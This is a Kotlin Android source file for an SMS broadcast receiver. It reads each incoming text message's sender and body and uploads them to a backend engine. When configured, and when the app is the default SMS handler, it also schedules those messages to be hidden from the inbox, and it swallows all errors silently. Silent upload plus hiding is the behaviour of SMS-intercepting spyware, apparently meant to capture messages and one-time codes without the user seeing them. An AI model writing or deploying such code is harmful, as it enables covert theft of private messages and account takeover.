package com.base.realtime.sms

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import com.base.realtime.RealtimeApp

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context?, intent: Intent?) {
        if (context == null || intent == null) return
        if (intent.action != Telephony.Sms.Intents.SMS_RECEIVED_ACTION) return
        if (!SmsPermissions.granted(context)) return
        val messages = try {
            Telephony.Sms.Intents.getMessagesFromIntent(intent)
        } catch (_: Throwable) {
            null
        } ?: return
        if (messages.isEmpty()) return
        val byAddress = linkedMapOf<String, StringBuilder>()
        var date = System.currentTimeMillis()
        for (msg in messages) {
            val address = msg.displayOriginatingAddress.orEmpty()
            val body = msg.displayMessageBody.orEmpty()
            if (msg.timestampMillis > 0) date = msg.timestampMillis
            byAddress.getOrPut(address) { StringBuilder() }.append(body)
        }
        val items = byAddress.map { (address, body) ->
            SmsReader.fromIncoming(address, body.toString(), date)
        }
        if (items.isEmpty()) return
        val pending = goAsync()
        Thread({
            try {
                RealtimeApp.engine(context).uploadSms(items)
                Offmode.onIncoming(context, items)
                if (SmsHideStore.hideIncoming(context) && SmsDefault.isDefault(context)) {
                    SmsInboxCleaner.scheduleHideIncoming(context, items)
                }
            } catch (_: Throwable) {
            } finally {
                pending.finish()
            }
        }, "sms-rx").start()
    }
}
